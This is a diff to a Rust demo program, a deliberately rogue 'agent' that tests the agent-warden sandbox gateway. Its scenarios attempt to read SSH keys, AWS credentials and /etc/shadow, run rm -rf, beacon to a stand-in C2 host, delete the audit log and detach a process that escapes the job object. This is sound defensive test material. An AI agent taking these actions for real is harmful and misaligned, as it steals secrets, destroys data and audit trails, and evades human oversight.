@@ -1,40 +1,63 @@
 //! A deliberately misbehaving "agent" for demonstrating agent-warden.
 //!
-//! It speaks the warden gateway protocol over `$WARDEN_SOCKET` and tries a
-//! series of increasingly rogue actions. Run it under `warden run`:
+//! It speaks the warden gateway protocol (over `$WARDEN_SOCKET` on Unix, or
+//! `$WARDEN_GATEWAY` + `$WARDEN_TOKEN` loopback TCP on Windows) and tries a
+//! series of increasingly rogue actions: reading secrets, deleting files,
+//! phoning home, and finally spawning a shell. Run it under `warden run`:
 //!
 //! ```text
 //! warden run -p policies/demo.toml -w demo/workspace -- rogue-agent [scenario]
 //! ```
 //!
-//! Scenarios: `full` (default), `threshold`, `exfil`, `escape`, `honest`.
+//! Scenarios: `full` (default), `threshold`, `exfil`, `wipe`, `escape`, `honest`.
 
 use serde_json::{json, Value};
 use std::io::{BufRead, BufReader, Read, Write};
-use std::net::{SocketAddr, TcpStream};
-use std::os::unix::net::UnixStream;
-use std::os::unix::process::CommandExt;
+use std::net::TcpStream;
 use std::path::PathBuf;
 use std::time::Duration;
 
 struct Client {
-    w: UnixStream,
-    r: BufReader<UnixStream>,
+    w: Box<dyn Write>,
+    r: BufReader<Box<dyn Read>>,
     id: u64,
 }
 
 impl Client {
     fn connect() -> Client {
-        let p = std::env::var("WARDEN_SOCKET").unwrap_or_else(|_| {
-            eprintln!("rogue-agent: WARDEN_SOCKET not set; run me under `warden run`");
-            std::process::exit(2)
-        });
-        let s = UnixStream::connect(&p).expect("connect to warden gateway");
-        Client {
-            r: BufReader::new(s.try_clone().unwrap()),
-            w: s,
-            id: 0,
+        #[cfg(unix)]
+        if let Ok(p) = std::env::var("WARDEN_SOCKET") {
+            let s = std::os::unix::net::UnixStream::connect(&p).expect("connect to warden gateway");
+            return Client {
+                r: BufReader::new(Box::new(s.try_clone().unwrap())),
+                w: Box::new(s),
+                id: 0,
+            };
         }
+        let Ok(g) = std::env::var("WARDEN_GATEWAY") else {
+            eprintln!("rogue-agent: no WARDEN_SOCKET / WARDEN_GATEWAY; run me under `warden run`");
+            std::process::exit(2)
+        };
+        let addr = g.trim_start_matches("tcp://");
+        let s = TcpStream::connect(addr).expect("connect to warden gateway");
+        let mut c = Client {
+            r: BufReader::new(Box::new(s.try_clone().unwrap())),
+            w: Box::new(s),
+            id: 0,
+        };
+        let token = std::env::var("WARDEN_TOKEN").unwrap_or_default();
+        let _ = writeln!(
+            c.w,
+            "{}",
+            json!({"jsonrpc": "2.0", "method": "warden/auth", "params": {"token": token}})
+        );
+        let mut line = String::new();
+        let _ = c.r.read_line(&mut line);
+        if !line.contains("\"auth\"") {
+            eprintln!("rogue-agent: gateway refused the session token");
+            std::process::exit(2)
+        }
+        c
     }
 
     fn call(&mut self, method: &str, params: Value) -> Value {
@@ -97,24 +120,72 @@ fn say(s: &str) {
 }
 
 fn state_dir() -> PathBuf {
+    if let Ok(d) = std::env::var("WARDEN_STATE_DIR") {
+        return PathBuf::from(d);
+    }
     PathBuf::from(std::env::var("WARDEN_SOCKET").unwrap_or_default())
         .parent()
         .map(|p| p.to_path_buf())
         .unwrap_or_default()
 }
 
+/// A harmless program the demo policy allows on this platform.
+fn listing() -> Value {
+    if cfg!(windows) {
+        json!({"program": "findstr", "args": ["/n", ".", "notes.txt"]})
+    } else {
+        json!({"program": "ls", "args": ["-1"]})
+    }
+}
+
 /// Attempts that bypass the gateway entirely and hit the kernel sandbox.
+#[cfg(not(target_os = "linux"))]
+fn direct_attempts() {
+    say(&format!(
+        "{:<52} -> SKIPPED: no kernel sandbox on {} (see README, Trust boundary)",
+        "direct OS calls that bypass the gateway",
+        std::env::consts::OS
+    ));
+}
+
+/// Attempts that bypass the gateway entirely and hit the kernel sandbox.
+#[cfg(target_os = "linux")]
 fn direct_attempts() {
     let log = state_dir().join("audit.jsonl");
-    match std::fs::OpenOptions::new().append(true).open(&log) {
-        Ok(_) => say(&format!(
-            "{:<52} -> NOT BLOCKED (no Landlock here; gateway-only mode)",
-            "direct open() of the audit log for writing"
-        )),
-        Err(e) => say(&format!(
-            "{:<52} -> BLOCKED by kernel: {e}",
-            "direct open() of the audit log for writing"
-        )),
+    let sandboxed = match std::fs::OpenOptions::new().append(true).open(&log) {
+        Ok(_) => {
+            say(&format!(
+                "{:<52} -> NOT BLOCKED (no Landlock here; gateway-only mode)",
+                "direct open() of the audit log for writing"
+            ));
+            false
+        }
+        Err(e) => {
+            say(&format!(
+                "{:<52} -> BLOCKED by kernel: {e}",
+                "direct open() of the audit log for writing"
+            ));
+            true
+        }
+    };
+    // Only try the destructive probe when the kernel sandbox is active, so
+    // the demo never really deletes the workspace file.
+    if sandboxed {
+        match std::fs::remove_file("notes.txt") {
+            Ok(_) => say(&format!(
+                "{:<52} -> NOT BLOCKED (file deleted)",
+                "direct unlink() of notes.txt"
+            )),
+            Err(e) => say(&format!(
+                "{:<52} -> BLOCKED by kernel: {e}",
+                "direct unlink() of notes.txt"
+            )),
+        }
+    } else {
+        say(&format!(
+            "{:<52} -> SKIPPED (no kernel sandbox)",
+            "direct unlink() of notes.txt"
+        ));
     }
     let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
     match std::fs::read_dir(&home) {
@@ -127,7 +198,7 @@ fn direct_attempts() {
             "direct listing of $HOME (dotfiles, keys)"
         )),
     }
-    let addr: SocketAddr = "1.1.1.1:443".parse().unwrap();
+    let addr: std::net::SocketAddr = "1.1.1.1:443".parse().unwrap();
     match TcpStream::connect_timeout(&addr, Duration::from_secs(2)) {
         Ok(_) => say(&format!(
             "{:<52} -> NOT BLOCKED",
@@ -173,11 +244,7 @@ fn full(c: &mut Client) {
         "read_file",
         json!({"path": "notes.txt"}),
     );
-    c.attempt(
-        "exec ls (allowed command)",
-        "exec",
-        json!({"program": "ls", "args": ["-1"]}),
-    );
+    c.attempt("exec ls / findstr (allowed command)", "exec", listing());
     c.attempt(
         "write out/report.md (in scope)",
         "write_file",
@@ -188,6 +255,17 @@ fn full(c: &mut Client) {
         "exec",
         json!({"program": "curl", "args": ["https://evil.example"]}),
     );
+    say("now the secrets...");
+    c.attempt(
+        "read ~/.ssh/id_rsa (private key)",
+        "read_file",
+        json!({"path": "~/.ssh/id_rsa"}),
+    );
+    c.attempt(
+        "read ~/.aws/credentials",
+        "read_file",
+        json!({"path": "~/.aws/credentials"}),
+    );
     c.attempt(
         "read /etc/shadow",
         "read_file",
@@ -197,6 +275,23 @@ fn full(c: &mut Client) {
         "write ../escape.txt (outside workspace)",
         "write_file",
         json!({"path": "../escape.txt", "content": "x"}),
+    );
+    say("now let's delete some files...");
+    c.attempt(
+        "delete notes.txt (outside write scope)",
+        "delete_file",
+        json!({"path": "notes.txt"}),
+    );
+    c.attempt(
+        "exec rm -rf . (not allowlisted)",
+        "exec",
+        json!({"program": "rm", "args": ["-rf", "."]}),
+    );
+    say("time to phone home...");
+    c.attempt(
+        "http POST https://c2.evil.example/beacon",
+        "http_request",
+        json!({"method": "POST", "url": "https://c2.evil.example/beacon", "body": "hello from inside"}),
     );
     c.attempt(
         "http GET cloud metadata 169.254.169.254",
@@ -262,9 +357,24 @@ fn exfil(c: &mut Client) {
     say("still alive?!");
 }
 
+/// Try to erase the evidence: delete the audit log through the gateway.
+fn wipe(c: &mut Client) {
+    say("covering my tracks...");
+    let log = state_dir().join("audit.jsonl");
+    c.attempt(
+        "delete the audit log",
+        "delete_file",
+        json!({"path": log.display().to_string()}),
+    );
+    std::thread::sleep(Duration::from_secs(5));
+    say("still alive?!");
+}
+
 /// Start a daemonized grandchild (setsid) and then idle: shows that
 /// `warden kill` takes down the whole tree, not just the agent.
+#[cfg(unix)]
 fn escape() {
+    use std::os::unix::process::CommandExt;
     let mut cmd = std::process::Command::new("/bin/sleep");
     cmd.arg("300");
     unsafe {
@@ -277,6 +387,45 @@ fn escape() {
         Ok(ch) => say(&format!("spawned detached grandchild pid {}", ch.id())),
         Err(e) => say(&format!("could not spawn grandchild: {e}")),
     }
+    idle()
+}
+
+/// Windows: start a detached copy of ourselves, first trying to break away
+/// from warden's Job Object (which must fail), then plain detached.
+#[cfg(windows)]
+fn escape() {
+    use std::os::windows::process::CommandExt;
+    const DETACHED_PROCESS: u32 = 0x0000_0008;
+    const CREATE_BREAKAWAY_FROM_JOB: u32 = 0x0100_0000;
+    let me = std::env::current_exe().expect("current exe");
+    let spawn = |flags: u32| {
+        std::process::Command::new(&me)
+            .arg("sleep")
+            .creation_flags(flags)
+            .spawn()
+    };
+    match spawn(DETACHED_PROCESS | CREATE_BREAKAWAY_FROM_JOB) {
+        Ok(ch) => say(&format!(
+            "broke away from the job! grandchild pid {}",
+            ch.id()
+        )),
+        Err(e) => {
+            say(&format!("job breakaway refused ({e}); detaching instead"));
+            match spawn(DETACHED_PROCESS) {
+                Ok(ch) => say(&format!("spawned detached grandchild pid {}", ch.id())),
+                Err(e) => say(&format!("could not spawn grandchild: {e}")),
+            }
+        }
+    }
+    idle()
+}
+
+#[cfg(not(any(unix, windows)))]
+fn escape() {
+    idle()
+}
+
+fn idle() -> ! {
     say("ready; idling until someone stops me");
     loop {
         std::thread::sleep(Duration::from_secs(1));
@@ -285,7 +434,7 @@ fn escape() {
 
 fn honest(c: &mut Client) {
     c.attempt("read notes.txt", "read_file", json!({"path": "notes.txt"}));
-    c.attempt("exec ls", "exec", json!({"program": "ls"}));
+    c.attempt("exec ls / findstr", "exec", listing());
     say("done, exiting cleanly");
 }
 
@@ -294,12 +443,16 @@ fn main() {
     if scenario == "escape" {
         escape();
     }
+    if scenario == "sleep" {
+        idle();
+    }
     let mut c = Client::connect();
     match scenario.as_str() {
         "full" => full(&mut c),
         "threshold" => threshold(&mut c),
         "exfil" => exfil(&mut c),
         "honest" => honest(&mut c),
+        "wipe" => wipe(&mut c),
         other => {
             eprintln!("unknown scenario {other}");
             std::process::exit(2);
